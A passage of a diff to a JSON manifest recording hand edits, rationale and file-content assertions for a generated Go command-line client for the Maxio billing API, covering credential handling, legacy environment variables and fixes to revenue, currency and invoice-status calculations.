+   "why": "The Basic payload <key>:x is held and its halves split, and MAXIO_PASSWORD reads as a credential name, so the constant x became a held value: every standalone x in output (and, through its encodings, every 78 and eA) printed the withheld marker. x is the same public constant for every Maxio account. Test seen failing first: seen/basic-constant-password-public-seen-failing.log in the run dir. (maxio 4.34.2 reprint)",
+   "asserts": [
     {
      "file": "cli/internal/client/client.go",
-     "not_contains": "c.maskCredentialText(truncateBody(respBody), authHeader)"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(string(body))"
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "not_contains": "cliutil.SanitizeErrorBody(truncateBody(body))"
-    },
-    {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "var funnelSteps = []func(string) []string{",
+     "contains": "credkit.Hold(\"minted:authorization\", cliutil.AuthHeaderHeldParts(authHeader)...)",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "funnelTextStep(funnelIdentityUnescape),",
+     "file": "cli/internal/cliutil/maxio_credential_names.go",
+     "contains": "func AuthHeaderHeldParts(",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelHeld(text string) string {",
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "{Source: \"header:authorization\",",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelCodexRound2(t *testing.T) {",
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "func holdLegacyPassword() {",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/secret_funnel_cli.go",
-     "contains": "func funnelCommandErrors(root *cobra.Command) {",
+     "file": "cli/internal/maxioblackbox/maxio_classes_test.go",
+     "contains": "func TestConstantPasswordIsNeverHeld(t *testing.T) {",
      "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "legacy-basic-env",
+   "status": "active",
+   "summary": "The published MAXIO_USERNAME (the API key) and MAXIO_PASSWORD (x) pair keeps working on the 4.34.2 single-secret auth: MAXIO_USERNAME supplies the key when MAXIO_API_KEY is unset, MAXIO_PASSWORD other than x is refused without echoing it",
+   "why": "Press 4.34.2 renders Basic {token}:x from MAXIO_API_KEY only (spec x-auth-env-vars); the 0.1.x docs and manifest told operators to set MAXIO_USERNAME and MAXIO_PASSWORD, so an upgrade would have silently lost their credential. config.go is generated: tools/apply_edits.py re-applies the call and the envHasCredential line; the logic lives in internal/config/maxio_auth_compat.go. (maxio 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "if err := applyLegacyBasicEnv(cfg); err != nil {",
      "code_only": true
     },
     {
-     "file": "cli/internal/cli/secret_funnel_cli_test.go",
-     "contains": "func TestFunnelCommandErrorsWithholdsAnEchoedCredential(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/config/config.go",
+     "contains": "return legacyBasicUsername() != \"\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/maxio_auth_compat.go",
+     "contains": "func applyLegacyBasicEnv(cfg *Config) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/maxio_auth_compat_test.go",
+     "contains": "func TestLegacyUsernamePasswordPairStillAuthenticates(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/maxio_auth_compat_test.go",
+     "contains": "func TestLegacyPasswordOtherThanXIsRefusedWithoutEcho(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "single-secret-api-key",
+   "status": "active",
+   "summary": "spec.json x-auth-env-vars [MAXIO_API_KEY] + x-auth-basic-password x: the client sends Authorization: Basic base64(MAXIO_API_KEY:x)",
+   "why": "Stock 4.34.2 reads the scheme description's constant password and renders one secret, but names it MAXIO_TOKEN (a name no doc, manifest or user ever used). Spec-encoded (tools/spec_fix.py): survives every reprint from this spec. (maxio 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "cliutil.EnvOverride(\"MAXIO_API_KEY\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "basicAuthPayload(\"Basic {token}:x\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "not_contains": "MAXIO_TOKEN"
+    }
+   ]
+  },
+  {
+   "id": "mcp-input-names-fit",
+   "status": "active",
+   "summary": "CreateSubscription.prepaid_configuration and SubscriptionGroupSignup.bank_account_attributes take one JSON flag each (--subscription-prepaid-configuration, --subscription-group-bank-account-attributes), so every MCP input name fits the 64-character tool property grammar",
+   "why": "Press 4.34.2 refuses to generate a tool whose flattened body flag exceeds 64 characters (subscription-prepaid-configuration-replenish-threshold-amount-in-cents is 70), and OpenAPI has no per-field flag name. A one-member anyOf around each of the two properties (same JSON on the wire) makes the press emit the object as one JSON-valued flag. Spec-encoded (tools/spec_fix.py). (maxio 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/subscription-groups_signup-with.go",
+     "contains": "\"subscription-group-bank-account-attributes\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/subscriptions_create-signup-proforma-invoice.go",
+     "contains": "\"subscription-prepaid-configuration\"",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "spec-path-param-examples",
+   "status": "active",
+   "summary": "spec.json gives every path parameter an example (subscription_id 15236915, component_id 399853, ...), so the 4.34.2 render emits a runnable Example on every command with path parameters",
+   "why": "press-traps s1: 4.34.0+ emits only runnable examples; a command whose path params carry no example gets none, and dogfood's example coverage fails. 257 params (tools/spec_fix.py). Spec-encoded: survives every reprint from this spec. (maxio 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/subscriptions_read.go",
+     "contains": "maxio-cli subscriptions read 15236915",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "revenue-default-sync",
+   "status": "active",
+   "summary": "A bare sync populates the resources the revenue novels read: customers, subscriptions, invoices, products, product families, components and their price points, coupons, subscription components and subscription MRR",
+   "why": "The generator's default sync list is three minor resources (endpoints, subscriptions components, subscriptions MRR), so after a plain sync every revenue command (mrr client, retention, triage, reconcile, arpa, churn, concentration, new-customers, renewals, revenue-mix) read an empty customers/subscriptions/invoices store. The 0.1.x tree carried this hand edit unrecorded; sync.go is generated: tools/apply_edits.py re-applies it. (maxio 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"customers-json\",\n\t\t\"subscriptions-json\",\n\t\t\"invoices-json\",",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "revenue-novels-registered",
+   "status": "active",
+   "summary": "Every shipped revenue command is registered and documented: the 7 researched novels plus mrr now, mrr sync, arpa, churn, concentration, new-customers, renewals and revenue-mix (now in research.json, so the render wires and documents them)",
+   "why": "The 0.1.x tree registered 6 hand-added novels by hand in root.go and documented none of them; a reprint from research alone would drop them. tools/research_fix.py adds all 8 to research.json. (maxio 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "addNovelCommandIfAbsent(rootCmd, newNovelArpaCmd(flags))",
      "code_only": true
     },
     {
      "file": "cli/internal/cli/root.go",
-     "contains": "funnelCommandErrors(rootCmd)",
+     "contains": "addNovelCommandIfAbsent(rootCmd, newNovelChurnCmd(flags))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "addNovelCommandIfAbsent(rootCmd, newNovelConcentrationCmd(flags))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "addNovelCommandIfAbsent(rootCmd, newNovelNewCustomersCmd(flags))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "addNovelCommandIfAbsent(rootCmd, newNovelRenewalsCmd(flags))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "addNovelCommandIfAbsent(rootCmd, newNovelRevenueMixCmd(flags))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mrr.go",
+     "contains": "cmd.AddCommand(newNovelMrrNowCmd(flags))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mrr.go",
+     "contains": "cmd.AddCommand(newNovelMrrSyncCmd(flags))",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "envelope-unwrap-native",
+   "status": "active",
+   "summary": "Maxio's singular list envelopes ([{\"customer\":{...}}]) are unwrapped by the press's own unwrapIDBearingEnvelopeItem before id extraction and storage; the 0.1.x hand file store/maxio_envelope.go is retired",
+   "why": "0.1.x patched store.go to call unwrapSingularEnvelope (unrecorded); press 4.34.x does the same natively for a single-key envelope whose inner object carries an id. The assert pins the native call so a press regression shows here. (maxio 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "unwrapIDBearingEnvelopeItem(resourceType, item, obj)",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "basic-constant-template-tests",
+   "status": "active",
+   "summary": "The template's credential-precedence tests decode the Basic header before looking for the secret (maxio renders Basic {token}:x), and its envelope test stores under a neutral resource name",
+   "why": "Press 4.34.2's own tests failed on this spec: credentials_test.go looked for the raw secret inside AuthHeader() (base64 here), and upsert_batch_test.go stored id-less items under 'customers', which maxio's render marks parameter-keyed. Generated test files: tools/apply_edits.py re-applies both; the helper is internal/cliutil/maxio_basic_header_test.go. (maxio 4.34.2 reprint)",
+   "spec_encode_followup": "Template tests should decode a Basic header (or assert via a credential-shape helper) and use a resource name the spec cannot claim.",
+   "asserts": [
+    {
+     "file": "cli/internal/cliutil/credentials_test.go",
+     "contains": "if got := basicDecodedAuthHeader(cfg.AuthHeader());",
+     "code_only": true,
+     "min_count": 5
+    },
+    {
+     "file": "cli/internal/store/upsert_batch_test.go",
+     "contains": "s.UpsertBatch(\"envelope-items\", items)",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r1-movement-identity-incomplete",
+   "summary": "An MRR movement is keyed on every member Maxio sends except its display text (subscription_id included), numbered within a page for identical records; a 0.1.x row is re-keyed by the first movement that matches its old key, never duplicated Identical records are numbered across the whole walk, so two identical same-second movements on either side of a page boundary stay two; a caught-up stop needs two quiet pages.",
+   "why": "The key hashed timestamp, category, amount, description and line items only, so two documented Movement records differing in subscription_id (one customer starting two identical subscriptions together) collapsed to one row and the waterfall reported half the new business. Test seen failing first: seen/r1-movement-identity-incomplete-seen-failing.log in the run dir. Codex review round 1 (maxio 4.34.2 reprint).",
+   "asserts": [
+    {
+     "file": "cli/internal/revenue/maxio_review_r1.go",
+     "contains": "func movementIdentity(raw json.RawMessage, occurrence int) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/revenue/revenue.go",
+     "contains": "key := movementIdentity(raw, seen[base])",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/revenue/revenue.go",
+     "contains": "`UPDATE rev_mrr_movements SET mvmt_key = ? WHERE mvmt_key = ?`, key, movementKey(m))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/revenue/maxio_r1_sync_test.go",
+     "contains": "func TestMovementIdentityKeepsEveryDocumentedMember(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/revenue/maxio_r1_sync_test.go",
+     "contains": "func TestLegacyMovementKeyIsClaimedNotDuplicated(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/revenue/revenue.go",
+     "contains": "insertMovements(ctx, db, mv.MRR.Movements, seen)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/revenue/maxio_r1_sync_test.go",
+     "contains": "func TestIdenticalMovementsAcrossAPageBoundaryStayTwo(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/revenue/maxio_r1_sync_test.go",
+     "contains": "func TestNewIdenticalMovementAloneOnTheLastPageIsNotLost(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ],
+   "status": "active"
+  },
+  {
+   "id": "r1-incomplete-backfill-read-as-complete",
+   "summary": "The movement backfill records whether the stored history reaches the log's first page: partial while a walk runs, complete only when one reaches page 1 or catches up with a complete history; a capped or failed walk walks on next time, mrr sync reports movements_complete / movements_error, and every movement reader warns while the history is partial A cold store whose first page failed warns too: churn and new-customers warn whenever the state is not complete, with or without stored movements.",
+   "why": "The walk stopped at the first already-stored page even when the older pages were never stored (mrr sync --max-pages 1, then --max-pages 0: September never arrived and retention reported zero starting MRR), and a failed page fetch ended the walk silently as if caught up. Test seen failing first: seen/r1-incomplete-backfill-read-as-complete-seen-failing.log in the run dir. Codex review round 1 (maxio 4.34.2 reprint).",
+   "asserts": [
+    {
+     "file": "cli/internal/revenue/revenue.go",
+     "contains": "if err := setSyncState(ctx, db, movementsBackfillKey, \"partial\"); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/revenue/revenue.go",
+     "contains": "res.MovementsError = fmt.Sprintf(\"fetching MRR movements page %d: %v\", page, gerr)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mrr_sync.go",
+     "contains": "if !res.MovementsComplete {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/revenue_helpers.go",
+     "contains": "func warnIfMovementsIncomplete(ctx context.Context, db *sql.DB, w io.Writer) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/retention.go",
+     "contains": "warnIfMovementsIncomplete(cmd.Context(), db, cmd.ErrOrStderr())",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mrr_waterfall.go",
+     "contains": "warnIfMovementsIncomplete(cmd.Context(), db, cmd.ErrOrStderr())",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/revenue/maxio_r1_sync_test.go",
+     "contains": "func TestCappedBackfillIsResumedNotReadAsComplete(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/revenue/revenue.go",
+     "contains": "if page == 1 || (prevComplete && quietPages >= 2) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/revenue_helpers.go",
+     "contains": "if !revenue.MovementsComplete(ctx, db) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/maxio_r1_revenue_test.go",
+     "contains": "func TestColdFailedBackfillWarnsEveryMovementReader(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ],
+   "status": "active"
+  },
+  {
+   "id": "r1-partial-snapshot-published",
+   "summary": "One MRR snapshot (the site row and every per-subscription row) is fetched first and written in one transaction; a failed or unreadable /mrr.json, /stats.json or per-subscription page leaves no part of it, and mrr now drops a live answer whose stats read failed",
+   "why": "Each per-subscription page committed on its own after the site row, and readers take the latest snapshot_at, so a page that failed (HTTP 500 on page 2 of 201 subscriptions) published a 200-subscription snapshot as the latest; a failed /stats.json was stored and shown as zero active subscriptions. Test seen failing first: seen/r1-partial-snapshot-published-seen-failing.log in the run dir. Codex review round 1 (maxio 4.34.2 reprint).",
+   "asserts": [
+    {
+     "file": "cli/internal/revenue/revenue.go",
+     "contains": "return nil, fmt.Errorf(\"fetching site stats: %w\", err)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/revenue/revenue.go",
+     "contains": "for _, s := range subs {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mrr_now.go",
+     "contains": "*view = mrrNowView{}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/revenue/maxio_r1_sync_test.go",
+     "contains": "func TestFailedSnapshotPublishesNothing(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "status": "active"
+  },
+  {
+   "id": "r1-current-states-narrowed-to-active",
+   "summary": "Every revenue command reads a current customer through one list, revenue.CurrentStates bound as a query argument (json_each): the documented live and problem SubscriptionStates (active, assessing, pending, trialing, paused, past_due, soft_failure, unpaid); triage scores the problem states",
+   "why": "triage, reconcile, concentration, renewals, mrr client and cohort filtered state='active', so a past_due subscription (documented Problem State) vanished: triage's past-due scoring was unreachable and the delinquent customer was never listed, and its MRR fell out of concentration and mrr client. Test seen failing first: seen/r1-current-states-narrowed-to-active-seen-failing.log in the run dir. Codex review round 1 (maxio 4.34.2 reprint).",
+   "asserts": [
+    {
+     "file": "cli/internal/revenue/maxio_review_r1.go",
+     "contains": "var CurrentStates = []string{\"active\", \"assessing\", \"pending\", \"trialing\", \"paused\", \"past_due\", \"soft_failure\", \"unpaid\"}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/triage.go",
+     "contains": "if revenue.IsProblemState(state.String) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/revenue/maxio_review_r1.go",
+     "contains": "func CurrentStatesArg() string { return jsonList(CurrentStates) }",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/triage.go",
+     "contains": "revenue.CurrentStatesArg()",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/reconcile.go",
+     "contains": "revenue.CurrentStatesArg()",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/concentration.go",
+     "contains": "revenue.CurrentStatesArg()",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/renewals.go",
+     "contains": "revenue.CurrentStatesArg()",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mrr_client.go",
+     "contains": "revenue.CurrentStatesArg()",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cohort.go",
+     "contains": "revenue.CurrentStatesArg()",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/churn.go",
+     "contains": "revenue.CurrentStatesArg()",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/triage.go",
+     "contains": "IN (SELECT value FROM json_each(?))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/reconcile.go",
+     "contains": "IN (SELECT value FROM json_each(?))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/concentration.go",
+     "contains": "IN (SELECT value FROM json_each(?))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/renewals.go",
+     "contains": "IN (SELECT value FROM json_each(?))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mrr_client.go",
+     "contains": "IN (SELECT value FROM json_each(?))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cohort.go",
+     "contains": "IN (SELECT value FROM json_each(?))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/churn.go",
+     "contains": "IN (SELECT value FROM json_each(?))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/triage.go",
+     "not_contains": "'$.state')='active'"
+    },
+    {
+     "file": "cli/internal/cli/reconcile.go",
+     "not_contains": "'$.state')='active'"
+    },
+    {
+     "file": "cli/internal/cli/concentration.go",
+     "not_contains": "'$.state')='active'"
+    },
+    {
+     "file": "cli/internal/cli/renewals.go",
+     "not_contains": "'$.state')='active'"
+    },
+    {
+     "file": "cli/internal/cli/mrr_client.go",
+     "not_contains": "'$.state')='active'"
+    },
+    {
+     "file": "cli/internal/cli/cohort.go",
+     "not_contains": "'$.state')='active'"
+    },
+    {
+     "file": "cli/internal/cli/maxio_r1_revenue_test.go",
+     "contains": "func TestCurrentCustomersIncludeProblemStates(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "status": "active"
+  },
+  {
+   "id": "r1-missing-invoice-detail-read-as-zero",
+   "summary": "The default invoices sync asks for line_items=true, and revenue-mix counts a billed invoice without line items in its total as unclassified (with a warning), never as zero",
+   "why": "GET /invoices.json returns totals only unless line_items=true (spec default false) and the generated sync asked for false, so revenue-mix read every synced invoice as zero billed revenue. sync.go is generated: tools/apply_edits.py re-applies the default. Test seen failing first: seen/r1-missing-invoice-detail-read-as-zero-seen-failing.log in the run dir. Codex review round 1 (maxio 4.34.2 reprint).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"line_items\":    \"true\",",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/revenue_mix.go",
+     "contains": "AND json_type(inv.data,'$.line_items') = 'array'",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/revenue_mix.go",
+     "contains": "view.UnclassifiedCents = cents",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/maxio_r1_revenue_test.go",
+     "contains": "func TestInvoiceWithoutLineItemsIsNotZeroRevenue(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "status": "active"
+  },
+  {
+   "id": "r1-unbilled-invoice-status-counted",
+   "summary": "Billed revenue is read through one allowlist, revenue.BilledInvoiceStatuses bound as a query argument: InvoiceStatus open, paid, pending, processing; draft, voided, canceled and unknown statuses bill nothing (reconcile, revenue-mix and its default month)",
+   "why": "reconcile summed every invoice status, so a voided $1,000 invoice beside a paid $100 one reported $1,100 invoiced and flagged a false gap; revenue-mix used a denylist that let any undocumented status through. Test seen failing first: seen/r1-unbilled-invoice-status-counted-seen-failing.log in the run dir. Codex review round 1 (maxio 4.34.2 reprint).",
+   "asserts": [
+    {
+     "file": "cli/internal/revenue/maxio_review_r1.go",
+     "contains": "var BilledInvoiceStatuses = []string{\"open\", \"paid\", \"pending\", \"processing\"}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/revenue/maxio_review_r1.go",
+     "contains": "func BilledInvoiceStatusesArg() string { return jsonList(BilledInvoiceStatuses) }",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/reconcile.go",
+     "contains": "revenue.BilledInvoiceStatusesArg(), currency, cutoff, cutoff, latest.String, revenue.CurrentStatesArg())",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/reconcile.go",
+     "contains": "AND LOWER(COALESCE(json_extract(inv.data,'$.status'),'')) IN (SELECT value FROM json_each(?))",
+     "code_only": true,
+     "min_count": 2
+    },
+    {
+     "file": "cli/internal/cli/revenue_mix.go",
+     "contains": "billed := revenue.BilledInvoiceStatusesArg()",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/revenue_mix.go",
+     "contains": "AND LOWER(COALESCE(json_extract(inv.data,'$.status'),'')) IN (SELECT value FROM json_each(?))",
+     "code_only": true,
+     "min_count": 3
+    },
+    {
+     "file": "cli/internal/cli/revenue_mix.go",
+     "not_contains": "NOT IN ('voided','canceled','draft')"
+    },
+    {
+     "file": "cli/internal/cli/maxio_r1_revenue_test.go",
+     "contains": "func TestUnbilledInvoiceStatusesAreNotRevenue(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "status": "active"
+  },
+  {
+   "id": "r1-currency-dropped",
+   "summary": "Every revenue command renders amounts in the site's currency (revenue.Money: $ only for USD, the ISO code otherwise, bare when unknown) and reports it; mrr now keeps the currency of the live figure or of the snapshot it read",
+   "why": "mrr now's local path did not read the snapshot's currency and defaulted to USD, and every command printed a dollar sign, so a EUR site's MRR came back as \"currency\":\"USD\", \"$100.00\"; reconcile and revenue-mix added invoices of every currency (Invoice.currency) into one total (seen/r1-currency-dropped-invoices-seen-failing.log); they now count only the site currency's and report how many they set aside. Test seen failing first: seen/r1-currency-dropped-seen-failing.log in the run dir. Codex review round 1 (maxio 4.34.2 reprint).",
+   "asserts": [
+    {
+     "file": "cli/internal/revenue/maxio_review_r1.go",
+     "contains": "func Money(c int64, currency string) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/revenue/maxio_review_r1.go",
+     "contains": "func SiteCurrency(ctx context.Context, db *sql.DB) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/revenue_helpers.go",
+     "contains": "func revenueMoney(ctx context.Context, db *sql.DB) (string, func(int64) string) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mrr_now.go",
+     "contains": "view.MRR = revenue.Money(view.MRRCents, view.Currency)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mrr_now.go",
+     "contains": "view.Currency = priorCurrency.String",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/reconcile.go",
+     "contains": "(COALESCE(json_extract(inv.data,'$.currency'),'') = '' OR UPPER(json_extract(inv.data,'$.currency')) = UPPER(?))",
+     "code_only": true,
+     "min_count": 2
+    },
+    {
+     "file": "cli/internal/cli/revenue_mix.go",
+     "contains": "(COALESCE(json_extract(inv.data,'$.currency'),'') = '' OR UPPER(json_extract(inv.data,'$.currency')) = UPPER(?))",
+     "code_only": true,
+     "min_count": 3
+    },
+    {
+     "file": "cli/internal/cli/arpa.go",
+     "not_contains": "revenue.Cents("
+    },
+    {
+     "file": "cli/internal/cli/churn.go",
+     "not_contains": "revenue.Cents("
+    },
+    {
+     "file": "cli/internal/cli/cohort.go",
+     "not_contains": "revenue.Cents("
+    },
+    {
+     "file": "cli/internal/cli/concentration.go",
+     "not_contains": "revenue.Cents("
+    },
+    {
+     "file": "cli/internal/cli/mrr_client.go",
+     "not_contains": "revenue.Cents("
+    },
+    {
+     "file": "cli/internal/cli/mrr_now.go",
+     "not_contains": "revenue.Cents("
+    },
+    {
+     "file": "cli/internal/cli/mrr_sync.go",
+     "not_contains": "revenue.Cents("
+    },
+    {
+     "file": "cli/internal/cli/mrr_waterfall.go",
+     "not_contains": "revenue.Cents("
+    },
+    {
+     "file": "cli/internal/cli/new_customers.go",
+     "not_contains": "revenue.Cents("
+    },
+    {
+     "file": "cli/internal/cli/reconcile.go",
+     "not_contains": "revenue.Cents("
+    },
+    {
+     "file": "cli/internal/cli/renewals.go",
+     "not_contains": "revenue.Cents("
+    },
+    {
+     "file": "cli/internal/cli/retention.go",
+     "not_contains": "revenue.Cents("
+    },
+    {
+     "file": "cli/internal/cli/revenue_mix.go",
+     "not_contains": "revenue.Cents("
+    },
+    {
+     "file": "cli/internal/cli/triage.go",
+     "not_contains": "revenue.Cents("
+    },
+    {
+     "file": "cli/internal/cli/usage_drivers.go",
+     "not_contains": "revenue.Cents("
+    },
+    {
+     "file": "cli/internal/cli/maxio_r1_revenue_test.go",
+     "contains": "func TestSnapshotCurrencyIsKept(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/maxio_r1_revenue_test.go",
+     "contains": "func TestInvoicesInAnotherCurrencyAreNotSummed(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "status": "active"
+  },
+  {
+   "id": "r1-movement-category-ignored",
+   "summary": "usage-drivers classifies each line item's MRR movement by its own category through the one classifier (revenue.Bucket); only expansion and contraction count as drivers",
+   "why": "Every positive line-item movement was expansion and every negative one contraction, so the spec's own example (a new_business line item, Cached Queries, 2173 cents) was reported as expansion. Test seen failing first: seen/r1-movement-category-ignored-seen-failing.log in the run dir. Codex review round 1 (maxio 4.34.2 reprint).",
+   "asserts": [
+    {
+     "file": "cli/internal/revenue/maxio_review_r1.go",
+     "contains": "func Bucket(category string, amountCents int64) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/usage_drivers.go",
+     "contains": "bucket := revenue.Bucket(mv.Category, cents)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/maxio_r1_revenue_test.go",
+     "contains": "func TestLineItemMovementCategoryIsRead(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "status": "active"
+  },
+  {
+   "id": "r1-subscription-counted-as-logo",
+   "summary": "A logo is a customer: churn counts a customer once, when none of its subscriptions is current, in the month (and with the method and reason) of its last cancellation; cohort logo retention counts customers by their first subscription's month",
+   "why": "churn COUNT(*)-ed canceled subscriptions, so a customer canceling one of two subscriptions was a churned logo; cohort's logo_retention_pct divided current subscriptions by started subscriptions. Test seen failing first: seen/r1-subscription-counted-as-logo-seen-failing.log in the run dir. Codex review round 1 (maxio 4.34.2 reprint).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/churn.go",
+     "contains": "HAVING SUM(CASE WHEN LOWER(COALESCE(state,'')) IN (SELECT value FROM json_each(?)) THEN 1 ELSE 0 END) = 0",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/churn.go",
+     "contains": "counted[cid.String] = true",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/cohort.go",
+     "contains": "r.LogoRetentionPct = round2(float64(r.CustomersRetained) / float64(r.CustomersStarted) * 100)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/maxio_r1_revenue_test.go",
+     "contains": "func TestLogosAreCustomersNotSubscriptions(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "status": "active"
+  },
+  {
+   "id": "credkit-wiring",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "The shared credential kit (tools/maintainer/credkit, vendored at cli/internal/credkit) is wired by hand and replaces the connector's hand-built output layer. internal/credwire/declarations.go holds the one Declarations literal (MAXIO_API_KEY, MAXIO_USERNAME, the MCP HTTP token, the config and 0600 credentials store, saved profiles, card and bank flags and fields) and shows the kit the base URL config.Load resolves; each main starts with credkit.Start and ends with credkit.Exit; every API, probe, webhook and feedback request goes through credkit.Transport (client.OutboundGuard); every journal, teach, feedback, profile, cache, rate-limit, lock, deliver and export write goes through the kit; the MCP server runs credkit.MCPTools, MCPIn and MCPOut. Retires secret-echo-decoded-funnel, replaced by the shared credential kit.",
+   "why": "Codex round 2 on the hand-built layer left credential-split-across-output-records open; its test was seen failing on the pre-kit build (.review/seen) and passes on the kit. A reprint regenerates main.go, client.go and the sink files and would silently drop the kit.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "var Declarations = credkit.Declarations{",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
